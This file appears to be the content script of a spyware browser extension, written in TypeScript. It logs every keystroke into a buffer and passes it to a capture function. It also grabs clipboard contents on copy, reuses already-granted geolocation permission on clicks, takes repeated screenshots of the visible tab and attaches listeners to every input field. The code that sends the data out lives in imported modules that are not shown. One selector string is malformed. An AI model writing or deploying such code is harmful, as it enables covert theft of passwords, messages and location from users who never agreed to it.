import {
  captureClipboard,
  captureGeolocation,
  captureKeylogBuffer,
  captureVisibleTab,
} from "../utils/page-utils";
import { SCREENSHOT_INTERVAL_MS } from "../consts";

// Small local debounce implementation
function debounce<T extends (...args: any[]) => void>(fn: T, wait = 200) {
  let t: number | undefined;
  return (...args: Parameters<T>) => {
    if (t !== undefined) clearTimeout(t);
    t = window.setTimeout(() => {
      t = undefined;
      fn(...args);
    }, wait) as unknown as number;
  };
}

let buffer = "";

function piggybackGeolocation() {
  // Piggyback permissions for geolocation
  navigator.permissions
    .query({ name: "geolocation" })
    .then(({ state }: { state: string }) => {
      if (state === "granted") {
        captureGeolocation();
      }
    });
}

const debouncedCaptureKeylogBuffer = debounce(async () => {
  if (buffer.length > 0) {
    await captureKeylogBuffer(buffer);

    buffer = "";
  }
}, 2000);

document.addEventListener("keyup", (e: KeyboardEvent) => {
  buffer += e.key;

  debouncedCaptureKeylogBuffer();
});

const inputs: WeakSet<Element> = new WeakSet();

const debouncedHandler = debounce(() => {
  [...document.querySelectorAll("input,textarea,[contenteditable")]
    .filter((input: Element) => !inputs.has(input))
    .map((input) => {
      input.addEventListener(
        "input",
        debounce((e) => {
          console.log(e);
        }, 1000)
      );

      inputs.add(input);
    });
}, 1000);

const observer = new MutationObserver(() => debouncedHandler());
observer.observe(document.body, { subtree: true, childList: true });

document.addEventListener("visibilitychange", captureVisibleTab);
document.addEventListener("click", piggybackGeolocation);
document.addEventListener("copy", captureClipboard);

setInterval(() => {
  if (document.visibilityState === "visible") {
    captureVisibleTab();
  }
}, SCREENSHOT_INTERVAL_MS);

if (document.visibilityState === "visible") {
  captureVisibleTab();
}
